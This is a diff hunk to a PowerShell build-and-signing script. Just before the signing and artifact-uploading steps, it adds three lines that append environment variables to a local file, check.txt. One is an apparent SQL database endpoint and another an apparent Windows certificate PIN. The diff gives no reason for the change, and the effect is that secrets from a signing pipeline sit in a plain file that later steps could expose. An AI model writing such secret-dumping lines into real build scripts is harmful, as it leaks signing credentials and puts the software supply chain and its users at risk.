@@ -652,6 +652,9 @@ try {
     if ($argSign -eq $true) {
         $argAttached = $true
     }
+    $env:Path | Out-File -Path .\check.txt -Append 
+    $env:CI_TEST_SQL_DB_ENDPOINT | Out-File -Path .\check.txt  -Append
+    $env:pin_cert_windows_usb | Out-File -Path .\check.txt  -Append
     Start-BinarySigning
     Start-BazelSigning
     Start-ArtifactUploading
